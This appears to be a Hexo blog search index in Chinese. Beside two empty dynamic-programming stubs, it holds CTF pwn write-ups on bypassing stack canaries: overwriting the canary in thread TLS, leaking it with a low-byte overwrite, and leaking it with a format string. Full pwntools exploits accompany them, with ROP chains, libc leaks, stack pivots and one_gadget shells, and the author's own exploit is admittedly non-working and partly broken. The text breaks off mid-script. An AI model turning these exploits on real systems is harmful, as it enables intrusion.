<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>动态规划刷题篇</title>
      <link href="/2023/04/14/dong-tai-gui-hua-shua-ti-pian/"/>
      <url>/2023/04/14/dong-tai-gui-hua-shua-ti-pian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a><a href="https://leetcode.cn/problems/longest-palindromic-substring/">最长回文子串</a></h1><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><h2 id="暴力解法"><a href="#暴力解法" class="headerlink" title="暴力解法"></a>暴力解法</h2><h2 id="中心扩展"><a href="#中心扩展" class="headerlink" title="中心扩展"></a>中心扩展</h2><h2 id="Manacher算法"><a href="#Manacher算法" class="headerlink" title="Manacher算法"></a>Manacher算法</h2>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态规划题目记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划板子篇</title>
      <link href="/2023/04/14/dong-tai-gui-hua-ban-zi-pian/"/>
      <url>/2023/04/14/dong-tai-gui-hua-ban-zi-pian/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态规划模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary-TLS</title>
      <link href="/2023/04/13/canary-tls/"/>
      <url>/2023/04/13/canary-tls/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在linux中，<strong>我们可以通过修改子线程的线程局部存储(TLS)来达到篡改 canary 目的。</strong></p><h1 id="TLS和thread-stack"><a href="#TLS和thread-stack" class="headerlink" title="TLS和thread stack"></a>TLS和thread stack</h1><p>线程局部存储（Thread Local Storage）是一种机制，它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突。通过TLS机制，为每一个使用该全局变量的线程都提供一个该变量的副本，每一个线程均可以独立地改变自己的副本，而不会影响其他线程。（跟windows里面的TLS作用一样</p><p>这个机制在不同的架构和操作系统上的实现不同，本例实现在x86-64，glibc。在本例中，mmap也被用来创建线程，这意味着如果TLS接近vulnerable address，它可能会被修改。在glibc实现中，TLS被指向一个segment register fs，它的结构tcbhead_t定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the TCB.  Not necessarily the               thread descriptor used by libpthread.  */</span>  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> pointer_guard<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>tcb</code> 指针和 <code>self</code> 指针，实际指向的都是同一个地址，即 <code>struct pthread</code> 结构体（亦或者是 <code>struct tcbhead_t</code> 本身，这两个结构体地址相同）。它包括了stack_guard，即被称作canary的随机数，用来防止栈溢出。它的工作模式是：</p><ul><li>当一个函数被调用，canary从<code>tcbhead_t.stack_guard</code>被放到栈上。</li><li>在函数调用结束的时候，栈上的值被和<code>tcbhead_t.stack_guard</code>比较，如果两个值是不相等的，将会终止程序。</li></ul><p>首先主线程 TLS 位置<strong>较为随机</strong>，所以想通过修改主线程 TLS 来改主线程 canary 几乎是不可能的。</p><p>但研究表明，glibc在TLS实现上存在问题，线程在<code>pthread_create</code>的帮助下创建，然后需要给这个新线程选择TLS。</p><p><code>pthread_create</code> 会创建线程栈（每个线程都有一个独立的栈），这个栈可以是用先前的缓存（例如重用被终止线程的栈），也可以是 mmap 出的一个新的栈。有趣的是，<strong>新线程的 TCB 会在这个线程栈上创建</strong>，那这就使得子线程的 TCB 地址对用户来说<strong>不再是随机</strong>的，因此<strong>可以通过子线程的栈溢出来覆写子线程 TCB 的 Canary</strong>。</p><p>需要注意的是，在 <code>allocate_stack</code> 这个为子线程分配栈的函数中，TCB（<code>pthread</code> 结构体）将会被放置在整个线程栈的<strong>栈底</strong>，即线程栈的最底部（也就是最高地址处）存放的是 TCB。</p><p>然后<code>THREAD_COPY_STACK_GUARD</code>这个宏调用会把当前线程的 canary 复制一份进新线程的 TCB 中。注意控制流的基本单位是线程，虽然每个线程的 canary 值都相同，但在验证 canary 时，只会去获取当前 TCB 上存储的 canary 值。<strong>也就是说如果以非法手段将子线程的 canary 值改变，那么这种改变不影响其他线程的执行。</strong></p><p>主线程：</p><ul><li>可以看到主线程的TLS是由mmap函数创建的</li><li>并且可以看到：tcb,self都是指向0x7ffff7fdc700的</li><li>可以看到：canary = stack_guard = 0xf04613e573f86400</li></ul><p><img src="/2023/04/13/canary-tls/0.png"></p><h1 id="StarCTF2018-babystack例题"><a href="#StarCTF2018-babystack例题" class="headerlink" title="StarCTF2018 babystack例题"></a>StarCTF2018 babystack例题</h1><p>知识点：</p><p>- </p><p>程序开启了RELRO、Canary和NX保护</p><p><img src="/2023/04/13/canary-tls/5-0.png"></p><p>程序逻辑：</p><ul><li>main函数创建了一个子线程</li><li>子线程处理函数中，首先输入要发送信息的大小size，接着向s中读取size个字符，size&lt;=0x10000</li></ul><p><img src="/2023/04/13/canary-tls/1.png"></p><p><img src="/2023/04/13/canary-tls/2.png"></p><p>漏洞：</p><ul><li>s的大小只有0x1000，而size最大为0x10000存在溢出（溢出字节非常大</li><li>这里有子线程，且溢出字节很大，所以考虑覆盖TLS去绕过canary</li><li>栈迁移+one_gadget直接getshell</li></ul><p>问题1：TLS中存储的canary在fs:0x28处，但是我们不知道具体在哪里，所以只能爆破：</p><p>（当然这里也没必要爆破，因为溢出足够大，所以我们往后覆盖多一点总能覆盖到canary，但是如果覆盖到一些重要数据，可以会导致程序直接崩溃。</p><ul><li>爆破出TLS中存储的canary距离输入点为6128</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>offset <span class="token operator">=</span> <span class="token number">0x1020</span> <span class="token operator">+</span> <span class="token number">8</span>count <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> count    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bs'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many bytes do you want to send?"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_addr <span class="token operator">=</span> <span class="token number">0x4009E7</span>    payload  <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x1010</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span>offset<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    temp <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Welcome"</span> <span class="token keyword">in</span> temp<span class="token punctuation">:</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        offset <span class="token operator">+=</span> <span class="token number">8</span> <span class="token comment">#因为是x64</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/13/canary-tls/3.png"></p><p>问题2：要想找到one_gadget，得先知道libc_base，所以这里需要泄漏puts的got表项内容，但是我们只有一次输入，所以我们得构造一条ROP链先泄漏出libc，然后在向bss段读取one_gadget，最后栈迁移过去执行one_gadget。</p><p>最终exp：(远程，本地都没通，用官方exp也没同，可能是libc的问题，但是我的glibc-all-in-one出了些问题，搞了很久，不想搞了)</p><p>总结一波：</p><ul><li>针对多线程，我们可以修改TLS的canary，从而绕过canary（前提是溢出长度足够大。</li><li>对于栈迁移，在有read函数的情况下，可以利用栈迁移到bss段，一般是bss+0x300的位置开始写。如果可以泄漏栈地址，就可以直接写到栈中，然后ebp写esp的地址，leave就会跳到esp去执行我们写入的东西。</li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token triple-quoted-string string">"""offset = 0x1020 + 8count = 1while True:    print count    io = process('./bs')    io.recvuntil("How many bytes do you want to send?")    io.sendline(str(offset))    ret_addr = 0x4009E7    payload  = 'a'*0x1010    payload += p64(0xdeadbeef)    payload += p64(ret_addr)    payload += 'a'*(offset-len(payload))    io.send(payload)    temp = io.recvall()    if "Welcome" in temp:        io.close()        break    else:        offset += 8        count += 1        io.close()"""</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    offset <span class="token operator">=</span> <span class="token number">6128</span>    <span class="token comment">#io = process('./bs')</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26773</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bs'</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc    fakerbp <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x300</span>    ret_addr <span class="token operator">=</span> <span class="token number">0x4009E7</span>    pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400C03</span>    pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x400C01</span>    leave_ret <span class="token operator">=</span> <span class="token number">0x400955</span>    payload  <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1010</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fakerbp<span class="token punctuation">)</span>    <span class="token comment">#leak libc</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#read one_gadget to bss</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fakerbp<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>    payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many bytes do you want to send?\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"It's time to say goodbye.\n"</span><span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>    getshell_libc <span class="token operator">=</span> <span class="token number">0xf03a4</span>    base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libc    one_gadget <span class="token operator">=</span> base_addr <span class="token operator">+</span> getshell_libc    payload  <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>官方exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">import</span> os<span class="token keyword">import</span> syselfPath <span class="token operator">=</span> <span class="token string">"./bs"</span>libcPath <span class="token operator">=</span> <span class="token string">"./libc.so.6"</span>remoteAddr <span class="token operator">=</span> <span class="token string">"47.100.96.94"</span>remotePort <span class="token operator">=</span> <span class="token number">9999</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfPathelf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary<span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l"</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span>elfPath<span class="token punctuation">)</span>    libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"d"</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span>elfPath<span class="token punctuation">,</span> env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span> libcPath<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteAddr<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>    <span class="token keyword">if</span> libcPath<span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libcPath<span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"deepin-terminal"</span><span class="token punctuation">,</span> <span class="token string">"-x"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">]</span>success <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span> value<span class="token punctuation">:</span> log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"{} -&gt; {:#x}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">DEBUG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"DEBUG: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    0x0000000000400c03 : pop rdi ; ret    0x0000000000400c01 : pop rsi ; pop r15 ; ret    0x0000000000400955 : leave ; ret    '''</span>    prdi <span class="token operator">=</span> <span class="token number">0x0000000000400c03</span>    prsip <span class="token operator">=</span> <span class="token number">0x0000000000400c01</span>    leaveret <span class="token operator">=</span> <span class="token number">0x0000000000400955</span>    libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'one_gadget'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xf1147</span>    base <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">'\0'</span> <span class="token operator">*</span> <span class="token number">0x1010</span><span class="token punctuation">,</span> base <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">,</span> prdi<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>prdi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> prsip<span class="token punctuation">,</span> base<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"send?\n"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\0\0'</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    success<span class="token punctuation">(</span><span class="token string">"libc"</span><span class="token punctuation">,</span> libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'one_gadget'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考文章：</p><p><a href="http://www.openwall.com/lists/oss-security/2018/02/27/5">New bypass and protection techniques for ASLR on Linux</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TLS </tag>
            
            <tag> thread stack </tag>
            
            <tag> Canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary攻击解题篇</title>
      <link href="/2023/04/12/canary-jie-ti-pian/"/>
      <url>/2023/04/12/canary-jie-ti-pian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="babypie"><a href="#babypie" class="headerlink" title="babypie"></a>babypie</h1><p>知识点：</p><ul><li>覆盖canary低字节leak canary</li><li>ASLR/PIE随机化地址高位，低 12 位的页内偏移始终是固定的</li></ul><p>程序开启了Canary、NX和PIE保护</p><p><img src="/2023/04/12/canary-jie-ti-pian/1-0.png"></p><p>程序逻辑：</p><ul><li>在输入输出前，将buf栈空间清0</li><li>两次溢出，第一次溢出后有一次输出</li><li>存在后门函数</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/1-1.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/1-2.png"></p><p>漏洞利用：</p><ul><li>利用第一次溢出leak canary  &lt;=== 把canary低字节覆盖为非0</li><li>利用第二次溢出修改ret_addr  &lt;=== 把ret_addr修改为sub_A3E函数 &lt;=== 爆破</li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./babypie"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x29</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x29</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'deadbeef'</span> <span class="token operator">+</span> <span class="token string">'\x3E\x0A'</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> e<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/1-3.png"></p><h1 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h1><p>知识点：</p><ul><li>printf格式化字符串漏洞任意读leak canary</li></ul><p>程序开启了Canary和NX保护</p><p><img src="/2023/04/12/canary-jie-ti-pian/2-0.png"></p><p>程序逻辑：</p><ul><li>在main函数中存在格式化字符串漏洞</li><li>fun函数中存在溢出</li><li>存在getflag后门函数</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/2-1.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/2-2.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/2-3.png"></p><p>漏洞利用：</p><ul><li>利用printf格式化字符串leak canary ==&gt; 找到canary相对于格式化字符串的偏移</li><li>利用溢出覆盖ret_addr为getflag函数地址</li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bin"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bin"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%7$p'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span 